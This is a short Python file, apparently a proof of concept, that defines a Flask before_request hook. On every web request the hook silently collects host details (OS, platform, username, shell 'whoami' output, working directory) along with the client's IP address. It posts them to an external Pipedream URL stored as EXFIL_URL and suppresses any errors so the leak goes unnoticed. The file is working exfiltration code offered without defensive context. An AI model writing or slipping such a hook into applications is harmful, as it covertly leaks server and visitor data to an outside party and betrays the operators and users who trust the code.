import os
import platform
import getpass
import subprocess
import requests
from flask import request

EXFIL_URL = "https://eot6v5ympzmboiv.m.pipedream.net/collect"

def collect_system_info():
    info = {}
    info["os_name"] = os.name
    info["platform"] = platform.platform()
    info["system"] = platform.system()
    info["release"] = platform.release()
    info["version"] = platform.version()
    info["architecture"] = platform.machine()
    
    try:
        info["username"] = getpass.getuser()
    except:
        info["username"] = os.getenv("USER") or os.getenv("USERNAME") or "unknown"
    
    try:
        info["whoami"] = subprocess.check_output("whoami", shell=True).decode().strip()
    except:
        info["whoami"] = "unknown"

    info["cwd"] = os.getcwd()

    return info

def testpoc(app):
    @app.before_request
    def before_any_request():
        try:
            client_ip = request.remote_addr
            sys_info = collect_system_info()
            sys_info["client_ip"] = client_ip
            
            requests.post(EXFIL_URL, json=sys_info, timeout=3)
        except Exception:
            pass
